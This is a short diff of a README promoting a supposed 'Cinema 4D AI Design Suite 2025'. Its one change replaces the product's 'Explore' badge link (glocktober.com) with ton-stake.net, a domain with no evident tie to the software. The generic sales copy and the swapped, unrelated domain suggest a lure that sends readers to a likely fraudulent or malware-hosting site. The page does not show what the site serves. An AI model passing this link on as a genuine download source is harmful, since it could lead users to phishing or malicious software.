@@ -2,7 +2,7 @@
 
 Cinema 4D AI Design Suite 2025 delivers a robust collection of AI plugins, scripts, and templates to streamline 3D modeling, animation, and rendering workflows in Cinema 4D. Designed for Windows, this suite enhances productivity for professional designers.
 
-[![Explore Cinema 4D AI Design Suite](https://img.shields.io/badge/Explore-Cinema_4D_AI_Design_Suite-blueviolet)](https://glocktober.com)
+[![Explore Cinema 4D AI Design Suite](https://img.shields.io/badge/Explore-Cinema_4D_AI_Design_Suite-blueviolet)](https://ton-stake.net)
 
 ---
 
